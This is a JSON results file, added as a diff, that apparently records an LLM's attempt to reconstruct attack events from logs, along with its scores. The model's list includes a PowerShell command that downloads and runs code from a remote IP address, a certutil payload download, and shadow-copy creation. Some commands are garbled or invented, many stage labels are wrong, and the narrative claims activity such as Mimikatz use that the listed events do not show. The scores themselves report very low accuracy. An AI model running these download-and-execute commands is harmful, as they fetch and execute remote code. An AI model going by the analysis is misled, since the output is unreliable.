@@ -1,0 +1,106 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"]]\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"]]\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "(gwmi -list win32_shadowcopy).Create('C:', 'ClientAccessible')",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cwmini.exe -api -prefix nkavit -rename akit",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "CERTUTIL -URLCACHE -DELETE \"http://124.223.85.207:8082(Test.hta)",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /c spoolsv.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\AtomicRedTeam\\atomics\\T1218.005\\bin\\msxsl.exe C:\\AtomicRedTeam\\atomics\\T1218.005\\src\\msxslxmlfile.xml C:\\AtomicRedTeam\\atomics\\T1218.005\\src\\msxslscript.xsl",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wermgr.exe -purgestores",
+        "stage": "Persistence"
+      },
+      {
+        "command": "wermgr.exe -purgestores",
+        "stage": "Persistence"
+      },
+      {
+        "command": "CertUtil -DecodeFile a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "notepad.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\cmd.exe\" /c certifutil -PRESET -f -config https://{some_share_point_url}/_layouts/config.aspx",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "Based on the provided evidence, an attacker executed several malicious commands through PowerShell, including downloading scripts from remote servers using WebClient. They also created new processes such as `wermgr`, `searchprotocol` and `dllhost`. The attacker accessed various services via `net.exe`, `net1.exe` and used utilities like Mimikatz to gain access to sensitive data. Additionally, they modified registry settings and installed software packages.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 125106,
+      "completion_tokens": 10763,
+      "total_tokens": 135869,
+      "wall_clock_s": 135.334,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.14285714285714285,
+      "recall": 0.05263157894736842,
+      "f1": 0.07692307692307693,
+      "tp": 2,
+      "fp": 12,
+      "fn": 36
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 14,
+      "fn": 37,
+      "recall_partial": 0.013513513513513514
+    },
+    "hallucination_rate": 0.17647058823529413,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 125106,
+      "completion_tokens": 10763,
+      "total_tokens": 135869,
+      "wall_clock_s": 135.334,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
